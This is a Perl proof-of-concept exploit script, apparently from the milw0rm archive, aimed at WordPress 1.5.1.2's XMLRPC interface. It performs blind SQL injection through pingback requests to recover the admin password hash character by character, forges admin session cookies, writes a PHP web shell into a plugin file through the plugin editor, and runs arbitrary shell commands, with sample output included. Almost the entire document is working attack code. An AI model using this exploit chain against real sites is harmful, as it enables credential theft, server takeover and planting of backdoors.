#!/usr/bin/perl -w

# sorry for the late posting, had to test it. /str0ke

#################################################################
# Wordpress 1.5.1.2 Strayhorn // XMLRPC Interface SQL Injection #
#################################################################
# By James Bercegay // http://www.gulftech.org/ // June 21 2005 #
#################################################################
# Quick and dirty proof of concept that uses the XML RPC server #
# vulnerabilities I discovered to extract a password hash & use #
# that hash to execute shell commands on the server as httpd :) #
#################################################################
# Technical details of WordPress XMLRPC Interface SQL Injection #
#################################################################
# The vulnerability exist because all XMLRPC data is taken from #
# the HTTP_RAW_POST_DATA variable, and never sanatized properly #
# thus leaving the doors open for attack. Also, most if not all #
# the functions in xmlrpc.php are vulnerable to similar attacks #
#################################################################
#
# C:\Documents and Settings\James\Desktop>wp.pl http://pathto/wp admin 1 "id;uname -a;pwd;uptime"
# [*] Trying Host http://pathto/wp ...
# [+] The XMLRPC server seems to be working
# [+] Char 1 is 2
# [+] Char 2 is 1
# [+] Char 3 is 2
# [+] Char 4 is 3
# [+] Char 5 is 2
# [+] Char 6 is f
# [+] Char 7 is 2
# [+] Char 8 is 9
# [+] Char 9 is 7
# [+] Char 10 is a
# [+] Char 11 is 5
# [+] Char 12 is 7
# [+] Char 13 is a
# [+] Char 14 is 5
# [+] Char 15 is a
# [+] Char 16 is 7
# [+] Char 17 is 4
# [+] Char 18 is 3
# [+] Char 19 is 8
# [+] Char 20 is 9
# [+] Char 21 is 4
# [+] Char 22 is a
# [+] Char 23 is 0
# [+] Char 24 is e
# [+] Char 25 is 4
# [+] Char 26 is a
# [+] Char 27 is 8
# [+] Char 28 is 0
# [+] Char 29 is 1
# [+] Char 30 is f
# [+] Char 31 is c
# [+] Char 32 is 3
# [+] Host : http://pathto/wp
# [+] User : admin
# [+] Hash : 21232f297a57a5a743894a0e4a801fc3
# [*] Attempting to create shell ..
# [+] Trying filename hello.php ...
# [+] Trying to activate hello.php ...
# [+] Trying to execute id;uname -a;pwd;uptime ...
# [+] Successfully executed id;uname -a;pwd;uptime
#
# uid=1979(gulftech) gid=500(customer) groups=500(customer)
# FreeBSD example.com 4.10-RELEASE FreeBSD 4.10-RELEASE #0: Tue Jan 1
# 1 22:44:03 PST 2005     james@example.com:/usr/src/sys/compile/EXAMPLE  i386
#
# /www/htdocs/wp/wp-admin
# 8:07AM  up 35 days, 20:01, 1 user, load averages: 7.98, 8.24, 8.14
#
#################################################################

use LWP::UserAgent;
use Digest::MD5 qw(md5_hex);

my $ua = new LWP::UserAgent;
  $ua->agent("Wordpress Hash Grabber v1.0" . $ua->agent);

my @char = ("0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f");

my $host = $ARGV[0]; # The path to xmlrpc.php
my $user = $ARGV[1]; # The target login, default wp user is admin
my $post = $ARGV[2]; # Must be a valid pingback or part
                                    # of an entry title, very easy to
                                        # obtain if you know how to read :)
my $exec = $ARGV[3]; # Command to execute
my $pref = 'wp_';    # database prefix!
my $hash = '';

if ( !$ARGV[2] )
{
       die("Im Not Psychic ..\n");
}

print "[*] Trying Host $host ...\n";

my $res = $ua->get($host.'/xmlrpc.php');

if ( $res->content =~ /XML-RPC server accepts POST requests only/is )
{
       print "[+] The XMLRPC server seems to be working \n";
}
else
{
       print "[!] Something seems to be wrong with the XMLRPC server \n ";
       # Sloppy way of debugging, remove if you want
       open(LOG, ">wp_out.html"); print LOG $res->content;
       exit;
}

for( $i=1; $i < 33; $i++ )
{
       for( $j=0; $j < 16; $j++ )
       {
                               # oh my! :)
                               my $sql = "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>foobar' UNION SELECT 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 FROM " . $pref . "users WHERE (user_login='$user' AND MID(user_pass,$i,1)='$char[$j]')/*</string></value></param><param><value><string>$host/?p=$post#$post</string></value></param><param><value><string>admin</string></value></param></params></methodCall>";

                               # Remove the content type so $HTTP_RAW_POST_DATA is
                               # populated. php.net guys, pleeeeaaase fix this! :)
                               my $req = new HTTP::Request POST => $host . "/xmlrpc.php";
                                  $req->content($sql);
                                  $res = $ua->request($req);
                              $out = $res->content;

               if ( $out =~ /The pingback has already been registered/)
               {
                   $hash .= $char[$j];
                   print "[+] Char $i is $char[$j]\n";
                   last;
               }

       }

   if ( length($hash) < 1 )
   {
               # Sloppy way of debugging, remove if you want
               open(LOG, ">wp_out.html"); print LOG $out;

               print "[!] $host not vulnerable? Better verify manually!\n";
               exit;
       }
                               if ( $out =~ /<value><int>0<\/int><\/value>/)
                               {
                                   print "[!] Invalid post information specified! \n";
                                       exit;
                               }

                               # Probably exploitable, but not by using default SQL query. The
                               # [0]{5} regex may be a bad idea bit ive never seen a md5 thats
                               # got 5 0's at the very beginning of it.
                               if ( $out =~ /different number of columns/is || $hash =~ /([0]{5})/ )
                               {
                                       # Sloppy way of debugging, remove if you want
                                       open(LOG, ">wp_out.html"); print LOG $out;

                                       print "[!] The database structured has been altered, check manually \n";
                                       exit;
                               }

}

# Verbose
print "[+] Host : $host\n";
print "[+] User : $user\n";
print "[+] Hash : $hash\n";

# We got the hash, so we are guaranteed admin
# even if we can not successfully execute! :)
print "[*] Attempting to create shell .. \n";

# Here we md5 the passhash, as well as the host
# in order to get the cookie hash, and the pass
# hash values respectively.
my $ckey = md5_hex($host);
  $hash = md5_hex($hash);

# Create the cookie used to make all admin requests
my @cookie = ('Referer' => $host.'/wp-admin/plugins.php;','Cookie' => 'wordpressuser_'.$ckey.'='.$user.'; wordpresspass_'.$ckey.'='. $hash);
  $res = $ua->get($host.'/wp-admin/plugin-editor.php', @cookie);

# Let's get the filename from the plugin editor
if ( $res->content =~ /<strong>(.*)\.php<\/strong>/i )
{
       # Seems our request went okay, and we have the filename!
       my @list = ($1.'.php', 'hello.php', 'markdown.php', 'textile1.php');
       my $file;

       # Make it work one way or another :)
       foreach $file (@list)
       {

               print "[+] Trying filename $file ...\n";
               $res = $ua->get($host.'/wp-admin/plugin-editor.php?file='.$file, @cookie);

               if ( $res->content =~ /<textarea[^>]*>(.*)<\/textarea>/is )
               {
                       # This is the file contents
                       my $data = $1;

                          # Quick and dirty way to fix the data recieved
                          # so that it executes and does not cause error
                          $data =~ s/&gt;/>/ig;
                          $data =~ s/&lt;/</ig;
                          $data =~ s/&quot;/"/ig;
                          $data =~ s/&amp;/&/ig;



                       # We use the <cmdout> tag to make it easy to grab out command output
                       my $add = ( $data =~ /<cmdout>(.*)<\/cmdout>/is ) ? '': '<cmdout><?php if ( !empty($_REQUEST["cmd"]) ) passthru($_REQUEST["cmd"]); ?></cmdout>';

                          # Adding our php code to the selected plugin
                          $res = $ua->post($host . "/wp-admin/plugin-editor.php", ['newcontent' => $add.$data, 'action' => 'update', 'file' => $file, 'submit' => 'foobar'], @cookie);

                          # Trying to activate the plugin. If the requests doesn't succeed
                          # then the command execution will fail unless the plugin has had
                          print "[+] Trying to activate $file ... \n";
                          $res = $ua->get($host.'/wp-admin/plugins.php?action=activate&plugin='.$file , @cookie);

                          # Depending on the plugin this should execute
                          # our command, else we try the file directly!
                          # this works everytime on the default install
                          print "[+] Trying to execute $exec ... \n";
                      $res = $ua->get($host.'/wp-admin/plugins.php?cmd='.$exec, @cookie);

                          # It seems we have executed our command successfully
                          if ( $res->content =~ /<cmdout>(.*)<\/cmdout>/is )
                          {
                                  # Send results to STDOUT
                              print "[+] Successfully executed $exec\n\n\n";
                                  print $1;
                                  exit;
                          }
                          else
                          {
                                  # No luck with that particular method, so
                                  # we will try to access the modified file
                                  print "[!] Couldnt execute command $exec\n";
                                  open(LOG, ">wp_out.html"); print LOG $res->content;

                                  # Trying to access the file directly and execute
                                  print "[!] Trying to access $file directly!\n";
                                  $res = $ua->get($host.'/wp-content/plugins/'.$file.'?cmd='.$exec, @cookie);

                                   # It seems we have executed our command successfully
                                  if ( $res->content =~ /<cmdout>(.*)<\/cmdout>/is )
                                  {
                                          # Send results to STDOUT
                                  print "[+] Successfully executed $exec\n\n\n";
                                      print $1;
                                          exit;
                                  }
                                  else
                                  {
                                          # No luck, better take a look at things manually
                                      print "[!] Couldnt execute command $exec\n";
                                          print "[*] Try $host/wp-content/plugins/$file manually\n";
                                  }
                          }
               }
               else
               {
                       # Unable to get the file contents
                       print "[!] Could not read file $file \n";
                       open(LOG, ">wp_out.html"); print LOG $res->content . $file;
               }

       }

}
else
{
       # Unable to get the plugin information
       print "[!] Could Not Get Plugin Information\n";
       open(LOG, ">wp_out.html"); print LOG $res->content;
}

# fin
exit;

# milw0rm.com [2005-06-30]